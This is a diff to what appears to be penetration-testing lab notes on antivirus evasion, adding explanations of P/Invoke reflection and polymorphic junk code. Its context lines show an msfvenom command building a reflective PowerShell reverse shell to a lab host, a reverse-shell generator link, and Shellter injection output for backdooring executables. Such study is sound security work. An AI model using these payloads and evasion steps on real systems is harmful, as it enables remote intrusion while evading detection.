@@ -304,7 +304,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflec
 > 🔗 **RevShells** — generates ready-to-use reverse shell one-liners in any language including correctly-encoded PowerShell variants, faster than hand-writing them: [revshells.com](https://revshells.com)
 
 The `-f psh-reflection` format produces a complete PowerShell script that:
-- Imports `VirtualAlloc` (kernel32.dll), `CreateThread` (kernel32.dll), and `memset` (msvcrt.dll) via P/Invoke reflection
+- Imports `VirtualAlloc` (kernel32.dll), `CreateThread` (kernel32.dll), and `memset` (msvcrt.dll) via P/Invoke reflection (P/Invoke, or Platform Invocation, is .NET's mechanism for calling native Windows API functions directly from managed code like PowerShell; "via reflection" means those function definitions are set up dynamically at runtime rather than being compiled in statically, which avoids the fixed import-table signatures AV tools typically look for)
 - Base64-decodes the embedded shellcode at runtime
 - Allocates executable memory with `VirtualAlloc`
 - Copies the shellcode using `memset`
@@ -580,7 +580,7 @@ Interactive session — answer the prompts:
 Shellter's output during injection:
 - Traced 4422 instructions through the PE (~1 min in Wine mode)
 - Selected IAT method 7: `CreateFileMapping/MapViewOfFile` — the only memory allocation pair available in this PE's import table that Stealth Mode allows
-- Generated ~305 bytes of polymorphic junk code as obfuscation
+- Generated ~305 bytes of polymorphic junk code as obfuscation (meaningless filler instructions inserted between the real payload bytes; "polymorphic" means the filler changes its byte pattern on every injection run, so AV can't fingerprint a fixed sequence)
 - Injected at virtual address `0x40e733` (file offset `0xdb33`) inside `.text`
 - Verified the injected code is reachable: `Injection: Verified!`
 
@@ -755,7 +755,7 @@ Shellter interactive answers:
 | LHOST | `192.168.45.219` |
 | LPORT | `443` |
 
-Shellter selected IAT method 5 (`LoadLibrary/GetProcAddress`), injected at `0x4bb662` in `.text`, generated 365 bytes of polymorphic junk code. `Injection: Verified!`
+Shellter selected IAT method 5 (`LoadLibrary/GetProcAddress`), injected at `0x4bb662` in `.text`, generated 365 bytes of polymorphic junk code (same idea as above, filler bytes that change on every run so the overall byte pattern never looks the same twice). `Injection: Verified!`
 
 > 📸 Screenshot: Shellter's injection confirmed output and IAT method selected
 
